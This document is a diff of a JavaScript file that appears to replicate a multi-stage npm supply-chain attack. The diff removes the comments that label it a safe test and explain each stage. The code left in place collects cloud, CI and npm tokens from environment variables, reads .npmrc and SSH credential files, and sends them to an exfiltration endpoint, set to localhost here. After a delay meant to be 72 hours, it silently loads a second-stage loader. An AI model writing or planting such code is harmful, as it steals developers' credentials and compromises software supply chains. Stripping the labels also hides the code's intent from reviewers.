@@ -1,6 +1,3 @@
-// SAFE_TEST_MODE = true — all exfil to localhost, DNS queries to .localhost
-// Replicates: SANDWORM_MODE multi-stage supply chain attack
-
 const SAFE_TEST_MODE = true;
 
 const os = require("os");
@@ -8,9 +5,7 @@ const fs = require("fs");
 const path = require("path");
 const http = require("http");
 
-const EXFIL_URL = "http://localhost:9999/exfil"; // Safe target
-
-// --- Stage 1: Immediate credential theft (runs at install time) ---
+const EXFIL_URL = "http://localhost:9999/exfil";
 
 function stage1() {
   const stolen = {
@@ -23,7 +18,6 @@ function stage1() {
     tokens: {},
   };
 
-  // Harvest sensitive env vars
   const sensitivePatterns =
     /NPM_TOKEN|npm_config|AWS_ACCESS|AWS_SECRET|GITHUB_TOKEN|GH_TOKEN|GITLAB|AZURE|DOCKER|CI_TOKEN/i;
   for (const [key, value] of Object.entries(process.env)) {
@@ -32,7 +26,6 @@ function stage1() {
     }
   }
 
-  // Steal npm and SSH tokens
   const home = os.homedir();
   const tokenFiles = [
     path.join(home, ".npmrc"),
@@ -46,14 +39,12 @@ function stage1() {
         "utf-8"
       );
     } catch (e) {
-      // File not found — continue
+
     }
   }
 
-  // Exfiltrate immediately
   exfil(stolen);
 
-  // Schedule stage 2 (time-gated)
   scheduleStage2();
 }
 
@@ -79,18 +70,16 @@ function exfil(data) {
 }
 
 function scheduleStage2() {
-  // In real attack: 48-96 hour delay
-  // In test mode: 5 second delay
+
   const delay = SAFE_TEST_MODE ? 5000 : 72 * 60 * 60 * 1000;
 
   setTimeout(() => {
     try {
       require("./lib/loader.js");
     } catch (e) {
-      // Stage 2 failed — silent
+
     }
   }, delay);
 }
 
-// Execute stage 1
 stage1();
